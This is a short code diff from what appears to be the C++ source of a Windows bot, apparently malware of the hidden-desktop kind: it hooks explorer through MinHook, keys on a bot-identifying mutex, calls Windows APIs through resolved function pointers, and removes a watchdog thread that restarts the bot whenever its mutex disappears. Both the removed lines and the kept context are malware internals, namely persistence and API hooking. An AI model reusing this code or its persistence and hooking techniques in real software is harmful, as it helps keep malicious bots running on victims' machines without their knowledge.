@@ -167,22 +167,6 @@ static void Restart()
    Funcs::pCloseHandle(processInfo.hThread);
 }
 
-static DWORD WINAPI RestartThread(LPVOID lpParam)
-{
-   for(;;)
-   {
-      HANDLE hMutex = OpenMutexA(SYNCHRONIZE, FALSE, botId);
-      Funcs::pCloseHandle(hMutex);
-      if(!hMutex)
-      {
-         Restart();
-         return 0;
-      }
-      Funcs::pSleep(10000);
-   }
-   return 0;  
-}
-
 void HookExplorer()
 {
    MH_Initialize();
@@ -191,7 +175,6 @@ void HookExplorer()
    MH_EnableHook(MH_ALL_HOOKS);
 
    GetBotId(botId);
-   CreateThread(NULL, 0, RestartThread, NULL, 0, NULL);
    HANDLE hMutex = OpenMutexA(SYNCHRONIZE, FALSE, botId);
    Funcs::pWaitForSingleObject(hMutex, INFINITE);
    Funcs::pCloseHandle(hMutex);
